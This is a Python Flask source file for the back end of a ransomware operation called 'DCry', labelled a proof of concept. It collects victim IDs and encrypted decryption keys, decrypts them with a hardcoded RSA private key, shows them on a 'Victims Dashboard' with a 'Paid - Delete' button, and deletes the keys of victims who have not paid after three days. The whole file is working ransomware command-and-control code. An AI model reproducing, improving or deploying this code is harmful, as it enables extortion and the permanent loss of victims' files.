import re
import os
import shutil
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from flask_wtf.csrf import CSRFProtect
from datetime import datetime, timedelta
from markupsafe import escape as flask_escape
from flask import Flask, request, render_template_string, redirect, url_for

RSA_PRIVATE_KEY = """-----BEGIN RSA PRIVATE KEY-----
MIIEqAIBAAKCAQEAjdIcVka2US3tcvXqQ90+XNYt5bJv10x+/0KRSph03Z/RIp/g
OID2EEoF2Gs44BKj1C5UJsP8MyFHhWKob+WVA2vkUca2ZkA4EYxelivKGaEQlUmn
BQJsrmniCu6afj5Gq6mazVPIm48G20g8JS/ckkvJK9TAbLkqk9HQT9waIbhwuByd
KlcpxwPO3CZstFT3YWB+WQS0waPxqbB1PFGqPsYpPM5uBFYKj9aXXec7g6Xg992j
FJ3j8qQ2oi05KRe5OHrMvQNXd7vAfSjzguXKX5gHpY9z8iNTPwU5XBsQCGmQnvxd
tH80fqhDqfh8hZncYtvFGPfJ8g1TfN2huFjYzwIDAQABAoIBAAk38yeYiRlVxu2G
Fqg6pWcbdPhNVP/FtSuahB85Mb+GN+3sPoLtvxDn/uFGdvf5vjR4nne2nZolO6Tr
+M7tOXZzeO/n3steuUZKvYs9ZXGtCorpsrWcprvfnhXf1KMIIUffSnS2UX/rGCMA
2wf/yHKqAnWa6rcmghhu7+/FLINO5Y24lQ4KPA/crWc1LGedG264WWPwP1juKqCk
7JeS9RTSMHlU7doZeay9fW2kK2x+O0ieoYbiIXQzPb5ebuJnD8XLPPyjqxmoHEfd
WuYUFsgosmvVsLbhs+Vqv37RkD8K1wMnJVGCm1ScOkRAKcU9K8zLSsGIdTZmw9hp
81wpcOECgYkAk0baucx17R0bG71CJVXVwa5EeGV4A1EFf/HzabffCO3E9FES5JQl
hWiFB8gy4io5KUMc5VtDdlV+5uWEMellapFBJyv9Z7zcKSEs5qVOZKe4a43SCxFz
gv/JXC2uWTTMbspf2Q5oLw62lLECuZLuXLrkcoee8MdsZkqV03n3YX2L6SafzQUr
DQJ5APaEJZT9ib5LEgA0JFMgpd8Qp/BBnyivw77qbPKRuiEDvxWhtE3jVwKDybP3
IfHFD9gwwaokY33T39Cu/QdGh/K+RmPrLV+0l+DsC9bNQUou44qZelUQncvx9UCC
mkvklkuqqm9NRY/KfXaHrhokXGbH3eIMXmssSwKBiECsTaJneaWNMXlF68UPY1Ww
3BpunHwAWUTtD7Ht74AxQVr0OzKrJ6rk0f4v2MBeQEmxUgAZyo8tThPA2AM+9a0N
ain0dEvYsGlTSy9higJDcIWyenknyazN/DOBT92WhOtl7R8Y54E6mczDymmJbyjD
XUw55/7d4+kreY2rMonaItVYg7X5PgUCeHzqP4T86KSFs8xon5OD8qlS7lZ/WiAq
2HzQm35bO77pABX9B7mEHp4Gm9nWu9ugKMQ7CJenssaa60n6sfrS0aa+pjqRfD+H
6oIt+l3RSmlF00VzOhsKvXsP01/qDjew0DvtcknOFRak2+iJHj7e9/eZBaU68UlL
ewKBiCUQmGSESlvfKEyGkR9h0ieCvM/8xh0WgNqWnLztWtEhF/fTMVkuqFxqrVbc
QgNRtXbP/ulZU8c8xyiIW1O4urxsgEzXB5Fcf870D9g1THPoVCfnQQZNWt1Hblop
rz9v0fKUbjGqZGd/5hMzmWL6Lg2AnsxBXSCjEqm1x6SFuJMMmkmOMkWwANY=
-----END RSA PRIVATE KEY-----""" # Replace with your private key if needed

app = Flask(__name__)

app.config['SECRET_KEY'] = 'dcry-ransomware-poc'
csrf = CSRFProtect(app)

VICTIM_FOLDER = os.path.abspath(os.path.expanduser("~/dcry_victims/"))

os.makedirs(VICTIM_FOLDER, exist_ok=True)


def decrypt_key(encrypted_key):
    private_key = RSA.import_key(RSA_PRIVATE_KEY)
    cipher_rsa = PKCS1_OAEP.new(private_key)
    return cipher_rsa.decrypt(encrypted_key)


def sanitize_path_component(component):
    if not component:
        return "_"
    component = re.sub(r"[^a-zA-Z0-9_-]", "_", component)
    if component == "." or component == "..":
        return "_"
    return component

def is_safe_path(victim_id):
    base_dir = os.path.abspath(VICTIM_FOLDER)
    victim_path = os.path.join(base_dir, victim_id)
    real_victim_path = os.path.abspath(victim_path)
    return os.path.commonprefix([real_victim_path, base_dir]) == base_dir


def victim_is_expired(date_str, days_valid=3):
    try:
        infected_date = datetime.strptime(date_str, "%Y-%m-%d")
        return datetime.now() > infected_date + timedelta(days=days_valid)
    except Exception:
        return False


def delete_victim(victim_id):
    sanitized_id = sanitize_path_component(victim_id)
    if not is_safe_path(sanitized_id):
        app.logger.warning(f"Path Traversal attempt detected for deletion: {victim_id}")
        return
    path = os.path.join(VICTIM_FOLDER, sanitized_id)
    if os.path.isdir(path):
        shutil.rmtree(path)


@app.route("/upload", methods=["POST"])
def upload():
    username = request.form.get("username", "")
    vid_raw = request.form.get("id", "")
    date = request.form.get("date", "")
    key = request.form.get("key", "")
    vid = sanitize_path_component(vid_raw)
    if not vid or vid == "_":
        return "Invalid victim ID.", 400
    if not is_safe_path(vid):
        return "Path Traversal attempt detected.", 400
    folder = os.path.join(VICTIM_FOLDER, vid)
    os.makedirs(folder, exist_ok=True)
    info_path = os.path.join(folder, "info.txt")
    with open(info_path, "w") as f:
        f.write(f"username={username}\n")
        f.write(f"date={date}\n")
    key_path = os.path.join(folder, "key.txt")
    with open(key_path, "w") as f:
        f.write(decrypt_key(key))
    return "Upload success."


@app.route("/dashboard")
def dashboard():
    victims_data = []
    try:
        for vid in os.listdir(VICTIM_FOLDER):
            if not is_safe_path(vid):
                continue

            vid_safe = sanitize_path_component(vid)
            if not vid_safe or vid_safe == "_":
                continue

            folder = os.path.join(VICTIM_FOLDER, vid_safe)
            info_path = os.path.join(folder, "info.txt")
            key_path = os.path.join(folder, "key.txt")

            if not os.path.isfile(info_path) or not os.path.isfile(key_path):
                continue

            try:
                info = {}
                with open(info_path, "r") as f:
                    for line in f:
                        if "=" in line:
                            k, v = line.strip().split("=", 1)
                            info[k] = v

                if victim_is_expired(info.get("date", ""), 3):
                    delete_victim(vid_safe)
                    continue

                with open(key_path, "r") as f:
                    key = f.read()

                victims_data.append(
                    {
                        "username": flask_escape(info.get("username", "")),
                        "id": flask_escape(vid_safe),
                        "date": flask_escape(info.get("date", "")),
                        "key": flask_escape(key),
                    }
                )
            except Exception as e:
                app.logger.error(f"Error reading victim data for {vid_safe}: {e}")
                continue
    except Exception as e:
        app.logger.error(f"Error listing victims: {e}")
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>DCry Victims Dashboard</title>
        <meta http-equiv="refresh" content="5">
        <style>
            body { background: #121212; color: #eee; font-family: monospace; }
            table { border-collapse: collapse; width: 100%; }
            th, td { padding: 8px; border: 1px solid #555; }
            th { background: #222; }
            tr:hover { background: #333; }
            button { cursor: pointer; background: #007acc; color: white; border: none; padding: 5px 10px; border-radius: 3px; }
            button:hover { background: #005f99; }
        </style>
    </head>
    <body>
        <h1>DCry Victims Dashboard</h1>
        <table>
            <thead>
                <tr>
                    <th>Username</th><th>ID (folder)</th><th>Infected Date</th><th>Key</th><th>Action</th>
                </tr>
            </thead>
            <tbody>
            {% for v in victims %}
                <tr>
                    <td>{{ v.username }}</td>
                    <td>{{ v.id }}</td>
                    <td>{{ v.date }}</td>
                    <td><pre style="margin:0;">{{ v.key }}</pre></td>
                    <td>
                        <form method="post" action="{{ url_for('delete_victim_route') }}" onsubmit="return confirm('Delete victim {{ v.id }}?');">
                            <!-- THAY ĐỔI: Thêm trường ẩn chứa token CSRF -->
                            <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
                            <input type="hidden" name="victim_id" value="{{ v.id }}">
                            <button type="submit">Paid - Delete</button>
                        </form>
                    </td>
                </tr>
            {% endfor %}
            </tbody>
        </table>
    </body>
    </html>
    """
    return render_template_string(html, victims=victims_data)


@app.route("/delete_victim", methods=["POST"])
def delete_victim_route():
    victim_id = request.form.get("victim_id")
    sanitized_id = sanitize_path_component(victim_id)
    if not sanitized_id or sanitized_id == "_" or not is_safe_path(sanitized_id):
        return "Invalid or unsafe victim ID.", 400
        
    delete_victim(sanitized_id)
    return redirect(url_for("dashboard"))


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)